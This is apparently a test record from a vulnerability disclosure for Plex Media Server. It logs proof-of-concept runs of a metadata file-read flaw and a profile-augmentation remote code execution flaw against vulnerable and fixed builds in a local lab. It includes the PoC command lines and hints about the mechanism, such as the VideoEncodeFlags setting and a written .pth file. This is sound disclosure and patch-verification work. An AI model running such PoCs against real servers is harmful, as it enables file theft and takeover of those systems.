# Test Record

## Environment

- Test date: 2026-09-10
- Host architecture: x86-64
- Server platform: Linux Docker
- Python: `3.12.3`
- Docker: `29.1.3`
- Vulnerable amd64 image: `plexinc/pms-docker@sha256:dd9bcf6494a1f7e817710e75d2ff66beb68485b5ea1b63c7c712adc25983b9bb`
- Fixed amd64 image: `plexinc/pms-docker@sha256:c708587e4874617961a1bc24db9cffa2413653ff422f1b05dfec013339e6824d`
- Vulnerable server: `1.43.3.10861-07dfddaeb`
- Fixed server: `1.43.3.10896-cb3ebc72d`
- Authentication: generated `.LocalAdminToken` from each unclaimed lab server
- Network exposure: Docker port published on `127.0.0.1` only

The server configurations contained synthetic media and no user data.

## Results

| PoC | `1.43.3.10861-07dfddaeb` | `1.43.3.10896-cb3ebc72d` |
|---|---|---|
| `metadata-file-read/poc.py --file /etc/hostname` | HTTP 200, 13 bytes matched the container hostname | HTTP 400, target content not returned |
| `profile-extra-rce/poc.py --command 'touch /config/PROFILE_RCE_REPO_TEST'` | Per-run `.pth` created, container restarted, marker created | Profile setting ignored and per-run `.pth` not created |

The packaged file-read PoC and complete RCE PoC were executed successfully
against the vulnerable lab during final validation on 2026-09-10. Both scripts
were also compiled with `python3 -m py_compile`, and their command-line parsers
were invoked with `--help`.

The RCE test's executable `.pth` and marker were removed after verification.
The revised PoC removes its per-run `.pth`, x264 companion file, and HLS
bootstrap files on both successful and failed verification unless
`--keep-payload` is specified.

## Commands and exit status

Tokens are replaced with `TOKEN` below. The test rating key was `1`.

```bash
python3 metadata-file-read/poc.py \
  --url http://127.0.0.1:34161 --rating-key 1 \
  --token TOKEN --file /etc/hostname
# exit 0; stderr: HTTP 200: received 13 bytes

python3 profile-extra-rce/poc.py \
  --url http://127.0.0.1:34161 --rating-key 1 \
  --token TOKEN --command 'touch /config/PROFILE_RCE_REPO_TEST_3' \
  --container plex-file-read-fixed \
  --verify-path /config/PROFILE_RCE_REPO_TEST_3
# exit 0; payload verified, container restarted, marker verified

python3 metadata-file-read/poc.py \
  --url http://127.0.0.1:54260 --rating-key 1 \
  --token TOKEN --file /etc/hostname
# exit 1; HTTP 400; no target content

python3 profile-extra-rce/poc.py \
  --url http://127.0.0.1:54260 --rating-key 1 \
  --token TOKEN --command 'touch /config/PROFILE_RCE_FIXED_TEST_2' \
  --container plex-repo-fixed-10896 \
  --verify-path /config/PROFILE_RCE_FIXED_TEST_2
# exit 1; error: payload was not written to the per-run .pth path
```

## Fixed-build evidence

The fixed server logs the following message when the RCE profile augmentation
is supplied:

```text
ClientProfileExtra: ignoring transcode target setting VideoEncodeFlags, which may not be set from a profile augmentation
```

The fixed PMS binary also contains these metadata-reference validation strings:

```text
[Library] Rejecting metadata file request for unsupported media reference: %s
[Library] Rejecting metadata file request that escapes the bundle directory: %s
[Library] Ignoring media reference that escapes its bundle directory: %s
```

## Package hashes used during patch review

| Platform | Build | SHA-256 |
|---|---|---|
| Linux amd64 DEB | `1.43.3.10861-07dfddaeb` | `b3c3a910b4cb7dd8a77184196b0a7beabb19c790105cc47af9a9601ff12fd332` |
| Linux amd64 DEB | `1.43.3.10896-cb3ebc72d` | `aa09f266ddcf408e10cf7ba561b6e454e6e109ba9416396b6965bd4c79f37149` |
| Windows x86-64 | `1.43.3.10861-07dfddaeb` | `7c72b032c3a154b46bb4e2f2df8407b2aa55a2c457a04da334103921a9c3b45c` |
| Windows x86-64 | `1.43.3.10896-cb3ebc72d` | `92f1d6277b9cde5ad6c9b059e679276bca581d62a1299c9f77b15e541a70e3f3` |
| macOS universal | `1.43.3.10861-07dfddaeb` | `bf6b1466dbef552457b49be68e54020198987ea498622ec7cf95ae8252b243ee` |
| macOS universal | `1.43.3.10896-cb3ebc72d` | `185963b4043898a734db7b3d2b2845bc389492681544989550744edccb1a0e7b` |

## Sources

- [Plex security update announcement](https://forums.plex.tv/t/important-security-update-for-plex-media-server-v1-43-2-and-earlier/942319)
- [Official Plex downloads](https://www.plex.tv/media-server-downloads/)
